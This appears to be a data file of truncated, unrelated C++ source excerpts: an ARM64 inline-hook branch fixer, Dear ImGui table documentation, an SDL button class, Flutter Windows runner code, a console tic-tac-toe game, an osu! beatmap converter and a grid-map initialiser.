ls;\n                f.ad = ad;\n                return;\n            } //if\n        }\n        // What? GGing..\n    }\n\n    void process_fix_map(const intptr_t idx) {\n        for (auto &f : this->dat[idx].fmap) {\n            if (f.bp == NULL) break;\n            *(f.bp) = *(f.bp) |\n                      (((int32_t(this->dat[idx].ins - reinterpret_cast<int64_t>(f.bp)) >> 2)\n                              << f.ls) & f.ad);\n            f.bp = NULL;\n        }\n    }\n} context;\n\n//-------------------------------------------------------------------------\n\nstatic bool __fix_branch_imm(instruction inpp, instruction outpp, context *ctxp) {\n    static constexpr uint32_t mbits = 6u;\n    static constexpr uint32_t mask = 0xfc000000u; // 0b11111100000000000000000000000000\n    static constexpr uint32_t rmask = 0x03ffffffu; // 0b00000011111111111111111111111111\n    static constexpr uint32_t op_b = 0x14000000u; // \"b\"  ADDR_PCREL26\n    static constexpr uint32_t op_bl = 0x94000000u; // \"bl\" ADDR_PCREL26\n\n    const uint32_t ins = *(*inpp);\n    const uint32_t opc = ins & mask;\n    switch (opc) {\n        case op_b:\n        case op_bl: {\n            intptr_t current_idx = ctxp->get_and_set_current_index(*inpp, *outpp);\n            int64_t absolute_addr = reinterpret_cast<int64_t>(*inpp) +\n                                    (static_cast<int32_t>(ins << mbits)\n                                            >> (mbits - 2u)); // sign-extended\n            int64_t new_pc_offset =\n                    static_cast<int64_t>(absolute_addr - reinterpret_cast<int64_t>(*outpp))\n                            >> 2; // shifted\n            bool special_fix_type = ctxp->is_in_fixing_range",
    "// dear imgui, v1.85 WIP\n// (tables and columns code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] Commentary\n// [SECTION] Header mess\n// [SECTION] Tables: Main code\n// [SECTION] Tables: Simple accessors\n// [SECTION] Tables: Row changes\n// [SECTION] Tables: Columns changes\n// [SECTION] Tables: Columns width management\n// [SECTION] Tables: Drawing\n// [SECTION] Tables: Sorting\n// [SECTION] Tables: Headers\n// [SECTION] Tables: Context Menu\n// [SECTION] Tables: Settings (.ini data)\n// [SECTION] Tables: Garbage Collection\n// [SECTION] Tables: Debugging\n// [SECTION] Columns, BeginColumns, EndColumns, etc.\n\n*/\n\n// Navigating this file:\n// - In Visual Studio IDE: CTRL+comma (\"Edit.NavigateTo\") can follow symbols in comments, whereas CTRL+F12 (\"Edit.GoToImplementation\") cannot.\n// - With Visual Assist installed: ALT+G (\"VAssistX.GoToImplementation\") can also follow symbols in comments.\n\n//-----------------------------------------------------------------------------\n// [SECTION] Commentary\n//-----------------------------------------------------------------------------\n\n//-----------------------------------------------------------------------------\n// Typical tables call flow: (root level is generally public API):\n//-----------------------------------------------------------------------------\n// - BeginTable()                               user begin into a table\n//    | BeginChild()                            - (if ScrollX/ScrollY is set)\n//    | TableBeginInitMemory()                  - first time table is used\n//    | TableResetSettings()                    - on settings reset\n//    | TableLoadSettings()                     - on settings load\n//    | TableBeginApplyRequests()               - apply queued resizing/reordering/hiding requests\n//    | - TableSetColumnWidth()                 - apply resizing width (for mouse resize, often requested by previous frame)\n//    |    - TableUpdateColumnsWeightFromWidth()- recompute columns weights (of stretch columns) from their respective width\n// - TableSetupColumn()                         user submit columns details (optional)\n// - TableSetupScrollFreeze()                   user submit scroll freeze information (optional)\n//-----------------------------------------------------------------------------\n// - TableUpdateLayout() [Internal]             followup to BeginTable(): setup everything: widths, columns positions, clipping rectangles. Automatically called by the FIRST call to TableNextRow() or TableHeadersRow().\n//    | TableSetupDrawChannels()                - setup ImDrawList channels\n//    | TableUpdateBorders()                    - detect hovering columns for resize, ahead of contents submission\n//    | TableDrawContextMenu()                  - draw right-click context menu\n//-----------------------------------------------------------------------------\n// - TableHeadersRow() or TableHeader()         user submit a headers row (optional)\n//    | TableSortSpecsClickColumn()             - when left-clicked: alter sort order and sort direction\n//    | TableOpenContextMenu()                  - when right-clicked: trigger opening of the default context menu\n// - TableGetSortSpecs()                        user queries updated sort specs (optional, generally after submitting headers)\n// - TableNextRow()                             user begin into a new row (also automatically called by TableHeadersRow())\n//    | TableEndRow()                           - finish existing row\n//    | TableBeginRow()                         - add a new row\n// - TableSetColumnIndex() / TableNextColumn()  user begin into a cell\n//    | TableEndCell()                          - close existing column/cell\n//    | TableBeginCell()                        - enter into current column/cell\n// - [...]                                      user emit contents\n//-----------------------------------------------------------------------------\n// - EndTable()                                 user ends the table\n//    | TableDrawBorders()                      - draw outer borders, inner vertical borders\n//    | TableMergeDrawChannels()                - merge draw channels if clipping isn't required\n//    | EndChild()                              - (if ScrollX/ScrollY is set)\n//-----------------------------------------------------------------------------\n\n//-----------------------------------------------------------------------------\n// TABLE SIZING\n//-----------------------------------------------------------------------------\n// (Read carefully because this is subtle but it does make sense!)\n//-----------------------------------------------------------------------------\n// About 'outer_size':\n// Its meaning needs to differ slightly depending on if we are using ScrollX/ScrollY flags.\n// Default value is ImVec2(0.0f, 0.0f).\n//   X\n//   - outer_size.x <= 0.0f  ->  Right-align from window/work-rect right-most edge. With -FLT_MIN or 0.0f will align exactly on right-most edge.\n//   - outer_size.x  > 0.0f  ->  Set Fixed width.",
    "#include \"../headers/Buttons.h\"\n#include \"../headers/GetTexture.h\"\n#include <SDL2/SDL.h>\n#include <SDL2/SDL_image.h>\n#include <SDL2/SDL_ttf.h>\n#include <string>\n\nbutton::button(SDL_Renderer *Renderer, std::string text, int x, int y) {\n  buttonRenderer = Renderer;\n  textFont = TTF_OpenFont(\"assets/fonts/Kanit-Bold.ttf\", 45);\n  textColor = {255, 255, 255, 255};\n  buttonTexture = GetTexture(buttonRenderer, \"assets/img/rect.png\");\n  hoverTexture = GetTexture(buttonRenderer, \"assets/img/rect.png\");\n  clickTexture = GetTexture(buttonRenderer, \"assets/img/rect.png\");\n  SDL_SetTextureColorMod(buttonTexture, 0, 90, 255);\n  SDL_SetTextureColorMod(hoverTexture, 255, 200, 0);\n  SDL_SetTextureColorMod(clickTexture, 100, 100, 100);\n  currentTexture = buttonTexture;\n  currentState = KeyGone;\n  buttonBox.x = x;\n  buttonBox.y = y;\n  SDL_QueryTexture(buttonTexture, NULL, NULL, &buttonBox.w, &buttonBox.h);\n  textTexture = GetTexture(buttonRenderer, textFont, text, textColor, &textBox);\n  textBox.x = x + (buttonBox.w - textBox.w) / 2;\n  textBox.y = y + (buttonBox.h - textBox.h) / 2;\n}\n\nvoid button::CopyToRenderer() {\n  SDL_RenderCopy(buttonRenderer, currentTexture, NULL, &buttonBox);\n  SDL_RenderCopy(buttonRenderer, textTexture, NULL, &textBox);\n}\n\nvoid button::SetTexture(buttonState state) {\n  if (state == KeyGone)\n    currentTexture = buttonTexture;\n  else if (state == KeyOver)\n    currentTexture = hoverTexture;\n  else if (state == KeyDown)\n    currentTexture = clickTexture;\n}\nbutton::~button() {\n  SDL_DestroyTexture(buttonTexture);\n  buttonTexture = NULL;\n  SDL_DestroyTexture(hoverTexture);\n  hoverTexture = NULL;\n  SDL_DestroyTexture(clickTexture);\n  clickTexture = NULL;\n  currentTexture = NULL;\n  SDL_DestroyTexture(textTexture);\n  textTexture = NULL;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\r\n#include <windows.h>\r\nusing namespace std;\r\nint arr[4][4];                    //x-o\u0627\u0644\u0627\u0631\u0631\u0627\u064a \u0627\u0644\u0644\u064a \u0647\u064a\u0628\u0642\u064a \u062c\u0648\u0627\u0647\u0627 \u0627\u0644\r\nchar player1;                //\u062d\u0631\u0641 \u0627\u0644\u0644\u0627\u0639\u0628 \u0627\u0644\u0627\u0648\u0644\r\nchar player2;                //\u062d\u0631\u0641 \u0627\u0644\u0644\u0627\u0639\u0628 \u0627\u0644\u062b\u0627\u0646\u064a\r\nbool x = false;               // true\u0644\u0648 \u0627\u0644\u0644\u0627\u0639\u0628 \u0627\u0644\u0644\u064a \u0645\u062e\u062a\u0627\u0631 \u0627\u0643\u0633 \u0643\u0633\u0628 \u062f\u0627 \u064a\u0628\u0642\u064a \u0628\r\nbool o = false;\r\nbool flag = true;               // \u062f\u0627 \u0647\u0646\u062d\u062a\u0627\u062c\u0648 \u0639\u0634\u0627\u0646 \u0646\u063a\u064a\u0631 \u0627\u0644\u0627\u062f\u0648\u0627\u0631 \u0647\u062a\u0639\u0631\u0641\u0648 \u0628\u0639\u062f\u064a\u0646\r\nvoid display() {                    //\u0641\u0627\u0646\u0643\u0634\u0646 \u0628\u062a\u0638\u0647\u0631 \u0627\u0644\u0634\u0628\u0643\u0647\r\n    /*\r\n                                         |  1   |  2    |  3    |    4    |\r\n                                         ----------------------------------\r\n                                       1 |      |       |       |         |\r\n                                         ----------------------------------\r\n                                       2 |      |       |       |         |\r\n                                         ----------------------------------\r\n                                       3 |      |       |       |         |\r\n                                         ----------------------------------\r\n                                       4 |      |       |       |         |\r\n                                         ----------------------------------\r\n    */\r\n    system(\"cls\");\r\n    cout << \"  |  1  |  2  |  3  |  4  |\" << '\\n';\r\n    cout << \"  --------------------------\" << endl;\r\n    for (int i = 0; i < 4; i++) {\r\n        cout << i + 1 << ' ';                    //\u0639\u0634\u0627\u0646 \u064a\u0637\u0628\u0639 \u0627\u0644\u0631\u0642\u0645 \u0627\u0644\u0644\u064a \u062c\u0646\u0628 \u0643\u0644 \u0635\u0641 \u0632\u064a \u0645\u0627\u0646\u062a\u0627 \u0634\u0627\u064a\u0641 \u0643\u062f\u0647\r\n        for (int j = 0; j < 4; j++) {\r\n            if ((char)arr[i][j] == 0)            //\u0647\u0646\u0627 \u0644\u0648 \u0645\u0643\u0646\u0634 \u0641\u064a \u0639\u0646\u0635\u0631 \u0628\u064a\u062d\u0637 \u0645\u0633\u0627\u0641\u0647 \u0645\u0643\u0627\u0646\u0648 \u0639\u0634\u0627\u0646 \u0645\u064a\u0628\u0648\u0638\u0634 \u062a\u0646\u0633\u064a\u0642 \u0627\u0644\u0634\u0628\u0643\u0647\r\n                cout << \"|     \";\r\n            else {\r\n                cout << \"|  \" << (char)arr[i][j] << \"  \";\r\n\r\n            }\r\n        }\r\n        cout << \"|\\n  --------------------------\" << endl;\r\n\r\n    }\r\n\r\n\r\n\r\n\r\n}\r\n\r\nvoid the_game() {                //\u062f\u064a \u0628\u0642\u0627 \u0627\u0644\u0645\u0633\u0648\u0648\u0644\u0647 \u0639\u0646 \u0627\u0644\u0644\u0639\u0628 \u0628\u0642\u0627 \u0647\u064a \u0627\u0644\u0644\u064a \u0628\u062a\u062d\u062f\u062f \u0645\u064a\u0646 \u0627\u0644\u0644\u064a \u0639\u0644\u064a\u0647 \u0627\u0644\u062f\u0648\u0631 \u0648\u062a\u0634\u0648\u0641 \u0644\u0648 \u0641\u064a \u0634\u062e\u0635 \u062d\u0637 \u0641\u064a \u0645\u0643\u0627\u0646 \u0645\u064a\u0646\u0641\u0639\u0634\r\n    if (flag) {                    //\u0639\u0634\u0627\u0646 \u064a\u0642\u0648\u0644\u064a \u0627\u0646 \u0643\u062f\u0647 \u062f\u0648\u0631 \u0627\u0644\u0644\u0627\u0639\u0628 \u0627\u0644\u062a\u0627\u0646\u064afalse \u0627\u0644\u0644\u0627\u0639\u0628 \u0627\u0644\u0627\u0648\u0644\u064a \u0647\u0648 \u0627\u0644\u0644\u064a \u0639\u0644\u064a\u0647 \u0627\u0644\u062f\u0648\u0631 \u0648\u0628\u0639\u062f \u0627\u0644\u0644\u0627\u0639\u0628 \u0627\u0644\u0627\u0648\u0644 \u0645 \u0628\u064a\u062e\u0644\u0635 \u0628\u064a\u062a\u0639\u0645\u0644 true\u0627\u0644\u0644\u064a \u0639\u0627\u0645\u0644\u0648 \u0641\u0648\u0642 \u062f\u0627 \u0644\u0645\u0627 \u0628\u064a\u0643\u0648\u0646 \u0628 bool\u0627\u0644\u0644\u064a \u062c\u0648\u0627 \u062f\u064a \u0641 \u062f\u0627 \u0627\u0644flag \u0628\u0627\u0644\u0646\u0633\u0628\u0629 \u0644\r\n        //\u0627\u0644\u0644\u064a \u0627\u0646\u0627 \u0643\u0627\u062a\u0628\u0647\u0627 \u062f\u064a \u0628\u0633 \u0627\u0646\u0627 \u0628\u062e\u062a\u0635\u0631flag \u0647\u064a \u0647\u064a  flag == true \u0645\u0644\u062d\u0648\u0638\u0647 \r\n        cout << \"  -----------------------\" << '\\n';\r\n        cout << \"  player 1 it's your turn\" << \"\\n\";\r\n        cout << \"  -----------------------\" << \"\\n\\n\";\r\n        cout << \"--choose your Coordinates--\" << '\\n';\r\n        int x, y;\r\n        cin >> x >> y;\r\n        if (arr[x - 1][y - 1] == 'X' || arr[x - 1][y - 1] == 'O') {            //\u0628\u0634\u0648\u0641 \u0644\u0648 \u0627\u0644\u0645\u0643\u0627\u0646 \u0627\u0644\u0644\u064a \u0627\u062e\u062a\u0627\u0631\u0648 \u0627\u0644\u0644\u0627\u0639\u0628 \u062d\u062f \u0627\u062e\u062a\u0627\u0631\u0648 \u0642\u0628\u0644 \u0643\u062f\u0647 \u0648\u0644\u0627 \u0644\u0627\r\n            cout << \"You have to choose another Coordinates \\n\";\r\n            the_game();\t\t\t\t\t\t\t\t\t\t\t\t\t\t//\u0627\u0644\u0641\u0627\u0646\u0643\u0634\u0646 \u0647\u062a\u0639\u064a\u062f \u0646\u0641\u0633\u0647\u0627 \u0639\u0634\u0627\u0646 \u062a\u0634\u0648\u0641 \u0644\u0648 \u0641\u064a \u0623\u062e\u0637\u0621 \u0648\u0644\u0627 \u0644\u0627 \r\n            return;\r\n        }\r\n        if (x > 4 || y > 4) {                                //\u0644\u0648 \u0627\u0644\u0631\u0642\u0645 \u0627\u0644\u0644\u0644\u064a \u0627\u062e\u062a\u0627\u0631\u0648 \u0627\u0643\u0628\u0631 \u0645\u0646 4\r\n            cout << \"the number must be less than or equel 4\" << '\\n';\r\n            the_game();\r\n            return;\r\n        }\r\n        arr[x - 1][y - 1] = toupper(player1);            //\u0644\u0648 \u0627\u0644\u0631\u0642\u0645 \u0627\u0644\u0644\u064a \u062d\u0637\u0648 \u0627\u0644\u0634\u062d\u0635 \u0643\u0627\u0646 \u0635\u062d \u0648\u0639\u062f\u064a \u0645\u0646 \u0643\u0644 \u0627\u0644\u0644\u064a \u0641\u0627\u062a \u0647\u064a\u062d\u0637\u0648 \u0641\u064a \u0627\u0644\u0627\u0631\u0631\u064a \u0628\u0642\u0627\r\n        //\u0641 \u0647\u062a\u062d\u0648\u0644\u0648 \u0644\u0643\u0627\u0628\u062a\u0644small\u062f\u064a \u0628\u062a\u062e\u0644\u064a \u0627\u0644\u062d\u0631\u0641 \u0643\u0627\u0628\u062a\u0644 \u062d\u062a\u0649 \u0644\u0648 \u0627\u0644\u0634\u062e\u0635 \u0645\u062f\u062e\u0644\u0648 toupper \u0645\u0644\u062d\u0648\u0638\u0647 \u0641\u0627\u0646\u0643\u0634\u0646 \u0627\u0644\r\n        flag = false;               // \u0639\u0634\u0627\u0646 \u0627\u0644\u0645\u0631\u0647 \u0627\u0644\u062c\u0627\u064a\u0647 \u064a\u0628\u0642\u0649 \u0639\u0627\u0631\u0641 \u0627\u0646 \u0627\u0644\u0644\u064a \u0639\u0644\u064a\u0647 \u0627\u0644\u062f\u0648\u0631 \u0647\u0648 \u0627\u0644\u0644\u0627\u0639\u0628 \u0627\u0644\u062a\u0627\u0646\u064a false\u062f\u0627 \u064a\u0628\u0642\u0649 bool\u0647\u0646\u0627 \u0628\u064a\u062e\u0644\u064a \u0627\u0644\r\n\r\n    }\r\n    else {\r\n        cout << \"  -----------------------\" << '\\n';\r\n        cout << \"  player 2 it's your turn\" << \"\\n\";\r\n        cout << \"  -----------------------\" << '\\n';\r\n        cout << \"--choose your Coordinates--\" << '\\n';\r\n        int x, y;\r\n        cin >> x >> y;\r\n        if (arr[x - 1][y - 1] == 'X' || arr[x - 1][y - 1] == 'O') {\r\n            cout << \"You have to choose another Coordinates \\n\";\r\n            the_game();        //\u0627\u0644\u0641\u0627\u0646\u0643\u0634\u0646 \u0647\u062a\u0639\u064a\u062f \u0646\u0641\u0633\u0647\u0627 \u0639\u0634\u0627\u0646 \u062a\u0634\u0648\u0641 \u0644\u0648 \u0641\u064a \u0623\u062e\u0637\u0621 \u0648\u0644\u0627 \u0644\u0627 \r\n    \r\n            return;\r\n        }\r\n        if (x > 4 || y > 4) {\r\n            cout << \"the number must be less than or equel 4\" << '\\n';\r\n            the_game();       //\u0627\u0644\u0641\u0627\u0646\u0643\u0634\u0646 \u0647\u062a\u0639\u064a\u062f \u0646\u0641\u0633\u0647\u0627 \u0639\u0634\u0627\u0646 \u062a\u0634\u0648\u0641 \u0644\u0648 \u0641\u064a \u0623\u062e\u0637\u0621 \u0648\u0644\u0627 \u0644\u0627 \r\n        \r\n            return;\r\n        }\r\n        arr[x - 1][y - 1] = toupper(player2);\r\n        flag = true;\r\n\r\n    }\r\n}\r\nvoid check(char P1, char P2) {            //\u062f\u064a \u0641\u0627\u0646\u0643\u0634\u0646 \u0628\u062a\u0634\u062a\u063a\u0644 \u0644\u0645\u0627 \u0627\u0644\u0644\u0627\u0639\u0628 \u064a\u062f\u062e\u0644 \u0627\u0644\u062d\u0631\u0641 \u0628\u062a\u0627\u0639\u0648 \u0639\u0634\u0627\u0646 \u062a\u0634\u0648\u0641 \u0647\u0648 \u0645\u0638\u0628\u0648\u0637 \u0648\u0644\u0627 \u0644\u0627\r\n\r\n    if ((toupper(P1) != 88) && toupper(P1) != 79) {\r\n        cout << \"Player 1 -> You have to choose betwen X or O ONLY\" << endl;\r\n        cin >> P1;\r\n        check(P1, P2); //\u0627\u0644\u0641\u0627\u0646\u0643\u0634\u0646 \u0647\u062a\u0639\u064a\u062f \u0646\u0641\u0633\u0647\u0627 \u0639\u0634\u0627\u0646 \u062a\u0634\u0648\u0641 \u0644\u0648 \u0641\u064a \u0623\u062e\u0637\u0621 \u0648\u0644\u0627 \u0644\u0627 \r\n        \r\n        return;\r\n    }\r\n    if (toupper(P2) != 88 && toupper(P2) != 79) {\r\n        cout << \"Player 2 -> You have to choose betwen X or O ONLY\" << endl;\r\n        cin >> P2;\r\n        check(P1, P2);\r\n        return;\r\n    }\r\n    if (P1 == P2) {\r\n        cout << \"You can't choose \" << P1 << \" (player 1) have it",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\r\n#include <filesystem>\r\n#include <vector>\r\n#include <fstream>\r\n#include <sstream>\r\n#include <string.h>\r\n#include <string_view>\r\n#include <algorithm>\r\n\r\nvoid downgradeOsuFile(std::filesystem::path filePath, bool keepOD);\r\n\r\nstd::string removeCarriageReturn(std::string str)\r\n{\r\n  str.erase(std::remove(str.begin(), str.end(), '\\r'), str.end());\r\n  return str;\r\n}\r\nbool is_number(const std::string &s)\r\n{\r\n  std::string::const_iterator it = s.begin();\r\n  while (it != s.end() && std::isdigit(*it))\r\n    ++it;\r\n  return !s.empty() && it == s.end();\r\n}\r\nstd::string replaceString(std::string subject, const std::string &search, const std::string &replace)\r\n{\r\n  size_t pos = subject.find(search);\r\n  while (pos != std::string::npos)\r\n  {\r\n    subject.replace(pos, search.length(), replace);\r\n    pos = subject.find(search, pos + replace.length());\r\n  }\r\n  return subject;\r\n}\r\nbool string_contains(std::string input, std::string key)\r\n{\r\n  if (input.find(key) != std::string::npos)\r\n  {\r\n    return true;\r\n  }\r\n  return false;\r\n}\r\nstd::vector<std::string> split(std::string s, std::string delimiter)\r\n{\r\n  size_t pos_start = 0, pos_end, delim_len = delimiter.length();\r\n  std::string token;\r\n  std::vector<std::string> res;\r\n\r\n  while ((pos_end = s.find(delimiter, pos_start)) != std::string::npos)\r\n  {\r\n    token = s.substr(pos_start, pos_end - pos_start);\r\n    pos_start = pos_end + delim_len;\r\n    res.push_back(token);\r\n  }\r\n\r\n  res.push_back(s.substr(pos_start));\r\n  return res;\r\n}\r\nstd::vector<std::string> split_first(std::string s, std::string delimiter)\r\n{\r\n  size_t pos_start = 0, pos_end, delim_len = delimiter.length();\r\n  std::string token;\r\n  std::vector<std::string> res;\r\n\r\n  if ((pos_end = s.find(delimiter, pos_start)) != std::string::npos)\r\n  {\r\n    token = s.substr(pos_start, pos_end - pos_start);\r\n    res.push_back(token);\r\n    pos_start = pos_end + delim_len;\r\n  }\r\n\r\n  res.push_back(s.substr(pos_start));\r\n  return res;\r\n}\r\n\r\nint main()\r\n{\r\n  int option_range = 0;\r\n  std::cout << \"##################\\nosuTo2007 v1.6\\nosu! : _Railgun_\\nDiscord : @railgun_osu\\n##################\\n\\n\";\r\n  std::vector<std::filesystem::path> map_list;\r\n  for (const auto &entry : std::filesystem::directory_iterator(std::filesystem::current_path()))\r\n  {\r\n    if (entry.path().extension() == \".osu\")\r\n    {\r\n      map_list.push_back(entry.path());\r\n    }\r\n  }\r\n  if (map_list.size() == 0)\r\n  {\r\n    std::cout << \"No .osu files found\\nExiting...\";\r\n    return 0;\r\n  }\r\n  else\r\n  {\r\n    std::cout << \"Choose which .osu file you want to convert to v3:\\n\\n\";\r\n    if (map_list.size() > 1)\r\n    {\r\n      std::cout << \"0 = All listed below\\n\";\r\n    }\r\n    for (size_t i = 1; i - 1 < map_list.size(); i++)\r\n    {\r\n      std::cout << i << \" = \" << map_list[i - 1].filename() << \"\\n\";\r\n      option_range++;\r\n    }\r\n  }\r\nopt:\r\n  std::cout << \"Choose an option:\\n\";\r\n  std::string input;\r\n  std::cin >> input;\r\n  if (!is_number(input))\r\n  {\r\n    std::cout << \"Not a number\\n\";\r\n    goto opt;\r\n  }\r\n  if (!(std::stoi(input) < option_range + 1))\r\n  {\r\n    std::cout << \"Invalid Option\\n\";\r\n    goto opt;\r\n  }\r\n  bool keep_OD;\r\nopt2:\r\n  std::cout << \"Because in v3 AR(ApproachRate) is tied to OD(OverallDifficulty):\\nOD = AR\\nDo you prefer to have:\\n1 = same OverallDifficulty (map might be hard to read)\\n2 = same ApproachRate (map might be hard to acc)\\n\";\r\n  std::string input2;\r\n  std::cin >> input2;\r\n  if (!is_number(input2))\r\n  {\r\n    std::cout << \"Not a number\\n\";\r\n    goto opt2;\r\n  }\r\n  if ((std::stoi(input2) < 1) || (std::stoi(input2) > 2))\r\n  {\r\n    std::cout << \"Invalid Option\\n\";\r\n    goto opt2;\r\n  }\r\n  if (input2 == \"1\")\r\n  {\r\n    keep_OD = true;\r\n  }\r\n  else\r\n  {\r\n    keep_OD = false;\r\n  }\r\n  if (std::stoi(input) == 0)\r\n  {\r\n    for (int i = 0; i < map_list.size(); i++)\r\n    {\r\n      downgradeOsuFile(map_list[i], keep_OD);\r\n    }\r\n  }\r\n  else\r\n  {\r\n    downgradeOsuFile(map_list[std::stoi(input) - 1], keep_OD);\r\n  }\r\n  return 0;\r\n}\r\n\r\nvoid downgradeOsuFile(std::filesystem::path filePath, bool keepOD)\r\n{\r\n  // predefined keys to search for\r\n  static std::vector<std::string> general_Var = {\"AudioFilename\", \"PreviewTime\", \"SampleSet\"};\r\n  static std::vector<std::string> metaData_Var = {\"Title\", \"Artis\", \"Creator\", \"Version\"};\r\n  static std::vector<std::string> difficulty_Var = {\"HPDrainRate\", \"CircleSize\", \"OverallDifficulty\", \"ApproachRate\", \"SliderMultiplier\", \"SliderTickRate\"};\r\n\r\n  // current filename\r\n  std::string fileName = \"(converted) \" + filePath.filename().string();\r\n\r\n  // osu file format version\r\n  std::string fileFormat = \"\";\r\n  std::string OD_line = \"\";\r\n  std::string AR_line = \"\";\r\n  std::vector<std::pair<std::string, std::string>> general, metadata, difficulty;\r\n  std::vector<std::string> events, timingPoints, hitObjects;\r\n  bool skip = false;\r\n  int section = 0;\r\n  std::cout << \"Downgrading \" << filePath.filename() << \" to v3 file format...\\n\";\r\n  std::ifstream file(filePath);\r\n  if (file.is_open())\r\n  {\r\n    std::string line;\r\n\r\n  ",
    "//\n// Created by \u8bb8\u6668\u6d69 on 2024/4/16.\n//\n\n#include \"MapFunction.h\"\n\nMapFunction::MapFunction(GlobalData &globalData) {\n    m_map = vector<vector<char>>(szOfMap, vector<char>(szOfMap));\n    for (int i = 0; i < szOfMap; ++i) {\n        for (int j = 0; j < szOfMap; ++j) {\n            m_map[i][j] = globalData.plat[i][j];\n        }\n    }\n\n    initDelivery(globalData);\n\n    // \u591a\u7ebf\u7a0b\u521d\u59cb\u5316\u4ea4\u8d27\u70b9\u5757\u6df1\u5ea6\u56fe\n    thread th1(&MapFunction::initDeliveryDepth, this, ref(globalData), 0, m_deliveryBlock.size() / 2);\n    thread th2(&MapFunction::initDeliveryDepth, this, ref(globalData), m_deliveryBlock.size() / 2, m_deliveryBlock.size());\n\n    th1.join();\n    th2.join();\n\n    initBerth(globalData);\n\n    // \u591a\u7ebf\u7a0b\u521d\u59cb\u5316\u6cca\u4f4d\u6df1\u5ea6\u56fe\n    thread th3(&MapFunction::initBerthDepth, this, ref(globalData), 0, m_berthBoatDepth.size() / 2);\n    thread th4(&MapFunction::initBerthDepth, this, ref(globalData), m_berthBoatDepth.size() / 2, m_berthBoatDepth.size());\n\n    th3.join();\n    th4.join();\n\n    initBerthWeight(globalData);\n\n    initRobotCreator(globalData);\n    initBoatCreator();\n\n    initGoodLocalDepth();\n\n    // \u8d27\u7269\u7684\u8d77\u59cb\u4e0b\u6807\u4e3a0\n    goodLeftIndex = 0;\n}\n\nvoid MapFunction::initDelivery(GlobalData &globalData) {\n    int n = m_map.size(), m = m_map[0].size();\n\n    set<pair<int, int>> visitedDelivery;\n\n    int count = 0;\n    for(int i = 0; i < m; i++){\n        for(int j = 0; j < n; j++){\n            if(m_map[i][j] == 'T' && !visitedDelivery.count({i, j})){\n                vector<pair<int, int>> deliveryBlock;\n\n                deliveryBlock.push_back({i, j});\n                visitedDelivery.insert({i, j});\n\n                queue<pair<int, int>> que;\n\n                m_pos2deliveryBlockID[{i, j}] = m_deliveryBlock.size();\n                que.push({i, j});\n\n                while (!que. empty()) {\n                    auto [x, y] = que. front();\n                    que.pop();\n                    for (auto& [dx, dy] : moves) {\n                        int u = x + dx;\n                        int v = y + dy;\n                        if (canMoveOn(u, v) && m_map[u][v] == 'T' && !visitedDelivery.count({u, v})){\n                            m_pos2deliveryBlockID[{u, v}] = m_deliveryBlock.size();\n                            que.push({u, v});\n                            deliveryBlock.push_back({u, v});\n                            